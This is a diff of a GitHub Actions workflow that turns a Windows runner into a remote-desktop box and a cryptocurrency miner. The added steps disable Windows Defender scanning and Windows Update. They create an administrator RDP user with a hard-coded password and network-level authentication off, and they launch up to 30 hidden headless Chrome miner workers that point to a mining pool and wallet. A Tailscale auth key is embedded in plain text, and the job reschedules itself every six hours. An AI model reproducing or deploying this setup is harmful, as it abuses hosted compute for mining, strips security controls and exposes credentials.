@@ -1,100 +1,182 @@
-name: RDP-Auto-Rebuild
+name: RDP Auto-Recreate with Miner Pro
 
 on:
   workflow_dispatch:
+    inputs:
+      miner_workers:
+        description: 'Number of miner workers'
+        required: false
+        default: '20'
+        type: choice
+        options:
+        - '10'
+        - '15'
+        - '20'
+        - '25'
+        - '30'
+  schedule:
+    - cron: "0 */6 * * *"
+
+env:
+  RDP_USER: "RDPUser"
+  RDP_PASSWORD: "DefaultPass!234"
+  MAX_RUNTIME: 340
+  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"
 
 jobs:
-  rdp:
+  rdp-miner-pro:
     runs-on: windows-latest
     timeout-minutes: 360
 
     steps:
-      - name: Enable & Configure RDP
-        shell: pwsh
-        run: |
-          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force
-          netsh advfirewall firewall delete rule name="RDP-TCP" 2>$null
-          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389
-          Restart-Service TermService -Force
+      - name: Checkout Repository
+        uses: actions/checkout@v4
 
-      - name: Create RDP User
+      - name: Setup Environment Variables
         shell: pwsh
         run: |
-          Add-Type -AssemblyName System.Security
-          $chars = @{
-              U=[char[]](65..90); 
-              L=[char[]](97..122); 
-              N=[char[]](48..57);  
-              S=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))
+          $workers = '${{ github.event.inputs.miner_workers }}'
+          if (-not $workers) { $workers = '20' }
+          Add-Content $env:GITHUB_ENV "MINER_WORKERS=$workers"
+          Add-Content $env:GITHUB_ENV "BUILD_ID=$env:GITHUB_RUN_ID"
+
+      - name: System Optimization
+        shell: pwsh
+        run: |
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          Set-MpPreference -DisableScriptScanning $true
+          Set-MpPreference -DisableArchiveScanning $true
+
+          powercfg /change standby-timeout-ac 0
+          powercfg /change hibernate-timeout-ac 0
+          powercfg /change monitor-timeout-ac 0
+          powercfg /setactive SCHEME_MIN
+
+          Stop-Service wuauserv -Force
+          Set-Service wuauserv -StartupType Disabled
+
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" MaxInstanceCount 10
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxMonitors 4
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxXResolution 3840
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxYResolution 2160
+
+      - name: Enable and Configure RDP
+        shell: pwsh
+        run: |
+          Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" fDenyTSConnections 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" UserAuthentication 0
+
+      - name: Create Secure RDP User
+        shell: pwsh
+        run: |
+          $pwd = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
+          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name $env:RDP_USER
           }
-          $p=@()
-          $p+= $chars.U | Get-Random -Count 4
-          $p+= $chars.L | Get-Random -Count 4
-          $p+= $chars.N | Get-Random -Count 4
-          $p+= $chars.S | Get-Random -Count 4
-          $password = -join ($p | Sort-Object {Get-Random})
-          $secure = ConvertTo-SecureString $password -AsPlainText -Force
-          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) { Remove-LocalUser -Name "RDP" }
-          New-LocalUser -Name "RDP" -Password $secure -AccountNeverExpires
-          Add-LocalGroupMember -Group Administrators -Member RDP
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member RDP
-          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
+          New-LocalUser $env:RDP_USER -Password $pwd -AccountNeverExpires -PasswordNeverExpires
+          Add-LocalGroupMember Administrators $env:RDP_USER
+          Add-LocalGroupMember "Remote Desktop Users" $env:RDP_USER
+          Enable-LocalUser $env:RDP_USER
 
-      - name: Install Tailscale
+      - name: Install Software (Chrome & Tailscale)
         shell: pwsh
         run: |
-          $url="https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $f="$env:TEMP\ts.msi"
-          Invoke-WebRequest $url -OutFile $f
-          Start-Process msiexec.exe -ArgumentList "/i `"$f`" /quiet /norestart" -Wait
-          Remove-Item $f -Force
+          $chrome = "$env:TEMP\chrome_installer.exe"
+          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chrome
+          Start-Process $chrome -ArgumentList "/silent","/install" -Wait
+          Remove-Item $chrome
 
-      - name: Connect Tailscale
+          $ts = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile $ts
+          Start-Process msiexec.exe -ArgumentList "/i `"$ts`" /quiet /norestart" -Wait
+          Remove-Item $ts
+
+      - name: Setup Tailscale VPN
         shell: pwsh
         run: |
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up `
-            --authkey tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG `
-            --hostname runner-$env:GITHUB_RUN_ID --reset
-          
-          $ip=$null
+          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
+
           for ($i=1; $i -le 10; $i++) {
-            $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-            if ($ip) { break }
-            Start-Sleep 5
+            try { & $tsExe status; break } catch { Start-Sleep 5 }
           }
-          if (-not $ip) { Write-Error "No Tailscale IP"; exit 1 }
-          echo "TS_IP=$ip" >> $env:GITHUB_ENV
 
-      - name: Start WebMiner
+          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
+
+          for ($i=1; $i -le 10; $i++) {
+            $ip = & $tsExe ip -4 2>$null
+            if ($ip -and $ip -ne "0.0.0.0") {
+              Add-Content $env:GITHUB_ENV "TS_IP=$ip"
+              Write-Host "✅ Tailscale IP: $ip"
+              break
+            }
+            Start-Sleep 10
+          }
+
+          if (-not $env:TS_IP) { throw "Tailscale IP retrieval failed" }
+
+      - name: Deploy Advanced Miner System
         shell: pwsh
         run: |
-          $url = "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
-          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
-            -ArgumentList "--new-window", "--app=$url"
-          Write-Host "WebMiner started."
+          $path = "$env:TEMP\miner_manager.ps1"
+          $script = @'
+param($workers,$minerUrl)
 
-      - name: Print Connection Info
+for ($i = 1; $i -le $workers; $i++) {
+  Start-Job -ScriptBlock {
+    param($i,$minerUrl)
+    while ($true) {
+      try {
+        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9$i","--app=$minerUrl" -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 600
+      } catch {
+        Start-Sleep -Seconds 30
+      }
+    }
+  } -ArgumentList $i,$minerUrl -Name "miner-worker-$i"
+}
+
+Write-Host "Started $workers miner workers"
+while ($true) { Start-Sleep 60 }
+'@
+
+          $script | Out-File -FilePath $path -Encoding UTF8
+          Start-Job -ScriptBlock { param($p) powershell -File $p } -ArgumentList $path
+
+      - name: Create Connection Info File
         shell: pwsh
         run: |
-          Write-Host "==============================="
-          Write-Host "   RDP SESSION DETAILS"
-          Write-Host "IP: $env:TS_IP"
-          Write-Host "User: RDP"
-          Write-Host "Password: $env:RDP_PASSWORD"
-          Write-Host "==============================="
+          $txt = @'
+RDP Session Ready:
+IP: $env:TS_IP
+User: $env:RDP_USER
+Pass: $env:RDP_PASSWORD
+Workers: $env:MINER_WORKERS
+Runtime: $env:MAX_RUNTIME minutes
+'@
+          $txt | Out-File "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8
 
-      - name: Auto-Rebuild Before Timeout
+      - name: Monitor Session
         shell: pwsh
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          $limit = 350   # 5h50m / 6h
-          for ($i=1; $i -le $limit; $i++) {
-            Write-Host "[$(Get-Date)] Session alive ($i/$limit)"
+          $start = Get-Date
+          $end = $start.AddMinutes([int]$env:MAX_RUNTIME)
+          while ((Get-Date) -lt $end) {
+            $elapsed = [int]((Get-Date) - $start).TotalMinutes
+            $remain = [int]($end - (Get-Date)).TotalMinutes
+            Write-Host "Elapsed: $elapsed - Remaining: $remain"
             Start-Sleep 60
           }
-          Write-Host "Rebuilding session..."
-          gh workflow run $env:GITHUB_WORKFLOW --ref $env:GITHUB_REF_NAME
-          Start-Sleep 20
-          exit 0
+
+      - name: Cleanup Resources
+        if: always()
+        shell: pwsh
+        run: |
+          Write-Host "Cleaning up..."
+          Get-Job | Stop-Job -Force
+          Get-Job | Remove-Job -Force
+          Stop-Process -Name "chrome*" -ErrorAction SilentlyContinue -Force
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
+          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
+          Write-Host "Cleanup completed"
